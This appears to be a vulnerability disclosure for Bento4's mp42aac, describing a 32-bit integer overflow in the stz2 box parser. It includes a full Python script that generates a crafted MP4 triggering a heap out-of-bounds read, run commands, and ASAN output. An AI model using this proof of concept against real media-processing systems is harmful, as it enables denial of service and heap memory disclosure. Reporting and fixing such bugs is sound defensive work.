## Bug0: AP4_Stz2Atom integer overflow in sample_count multiplication causes heap out-of-bounds read

In `AP4_Stz2Atom::AP4_Stz2Atom()` in `Ap4Stz2Atom.cpp`, the expression `sample_count * m_FieldSize` is evaluated as a 32-bit unsigned multiplication without any overflow guard, so a crafted `stz2` box with `sample_count=0x10000000` and `field_size=16` wraps the product to zero, allocates a zero-byte heap buffer, and causes every iteration of the entry-population loop to perform an out-of-bounds heap read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for AP4_Stz2Atom integer overflow -> heap OOB read.

When field_size=16 and sample_count=0x10000000:
  0x10000000 * 16 = 0x100000000 overflows 32-bit to 0
  table_size = (0+7)/8 = 0
  buffer = new unsigned char[0]  (0-byte allocation)
  loop: m_Entries[i] = AP4_BytesToUInt16BE(&buffer[i*2])
  -> buffer[0] is OOB read on a 0-byte heap buffer
"""

import struct

OUTPUT = "poc_input.mp4"


def make_box(fourcc, data=b''):
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc.encode('latin-1') + data


def make_fullbox(fourcc, version, flags, data=b''):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(fourcc, hdr + data)


# ftyp box
ftyp_payload = b'mp41' + struct.pack('>I', 0) + b'mp41'
ftyp = make_box('ftyp', ftyp_payload)

# mvhd (version 0)
MATRIX_IDENTITY = (
    struct.pack('>I', 0x00010000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x40000000)
)
mvhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    MATRIX_IDENTITY +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = make_fullbox('mvhd', 0, 0, mvhd_payload)

# tkhd (version 0, flags=3)
tkhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1) +
    b'\x00' * 4 +
    struct.pack('>I', 0) +
    b'\x00' * 8 +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 2 +
    MATRIX_IDENTITY +
    struct.pack('>I', 0) +
    struct.pack('>I', 0)
)
tkhd = make_fullbox('tkhd', 0, 3, tkhd_payload)

# mdhd (version 0)
mdhd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 44100) +
    struct.pack('>I', 0) +
    struct.pack('>H', 0x15C7) +
    struct.pack('>H', 0)
)
mdhd = make_fullbox('mdhd', 0, 0, mdhd_payload)

# hdlr (handler type 'soun')
hdlr_payload = (
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'\x00'
)
hdlr = make_fullbox('hdlr', 0, 0, hdlr_payload)

# smhd
smhd_payload = struct.pack('>HH', 0, 0)
smhd = make_fullbox('smhd', 0, 0, smhd_payload)

# dinf / dref
url_entry = make_fullbox('url ', 0, 1, b'')
dref_payload = struct.pack('>I', 1) + url_entry
dref = make_fullbox('dref', 0, 0, dref_payload)
dinf = make_box('dinf', dref)

# stsd (mp4a audio sample description)
mp4a_payload = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 8 +
    struct.pack('>H', 2) +
    struct.pack('>H', 16) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>I', 44100 << 16)
)
mp4a = make_box('mp4a', mp4a_payload)
stsd_payload = struct.pack('>I', 1) + mp4a
stsd = make_fullbox('stsd', 0, 0, stsd_payload)

# stts (0 entries)
stts_payload = struct.pack('>I', 0)
stts = make_fullbox('stts', 0, 0, stts_payload)

# stz2 (THE MALICIOUS BOX)
# field_size=16, sample_count=0x10000000
# 0x10000000 * 16 = 0x100000000 wraps to 0 in 32-bit
# table_size = (0+7)/8 = 0 -> 0-byte allocation -> heap OOB read in loop
FIELD_SIZE   = 16
SAMPLE_COUNT = 0x10000000

stz2_payload = (
    b'\x00\x00\x00' +
    struct.pack('>B', FIELD_SIZE) +
    struct.pack('>I', SAMPLE_COUNT)
)
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

# stco (0 entries)
stco_payload = struct.pack('>I', 0)
stco = make_fullbox('stco', 0, 0, stco_payload)

# Assemble stbl -> minf -> mdia -> trak -> moov
stbl = make_box('stbl', stsd + stts + stz2 + stco)
minf = make_box('minf', smhd + dinf + stbl)
mdia = make_box('mdia', mdhd + hdlr + minf)
trak = make_box('trak', tkhd + mdia)
moov = make_box('moov', mvhd + trak)

# mdat (empty)
mdat = make_box('mdat', b'')

mp4 = ftyp + moov + mdat
with open(OUTPUT, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] stz2: field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
print(f"[+] Expected: 0x{SAMPLE_COUNT:X} * {FIELD_SIZE} = "
      f"0x{(SAMPLE_COUNT * FIELD_SIZE) & 0xFFFFFFFF:X} (32-bit overflow)")
print(f"[+] table_size = (0+7)/8 = 0 -> 0-byte heap allocation -> OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==142658==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x5585cdd89b62 bp 0x7fffac5ab9b0 sp 0x7fffac5ab9a0
READ of size 1 at 0x502000000111 thread T0
    #0 0x5585cdd89b61 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51b61)
    #1 0x5585cdd8a9fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file can trigger an out-of-bounds heap read across up to 268 million loop iterations, leaking arbitrary bytes from adjacent heap allocations and enabling potential heap layout inference or information disclosure. The vulnerability is reachable through any invocation of `mp42aac` on an untrusted input file, requiring no authentication or special privileges. On systems without ASAN the process will likely crash with a segmentation fault on the first OOB access, constituting a reliable denial of service.
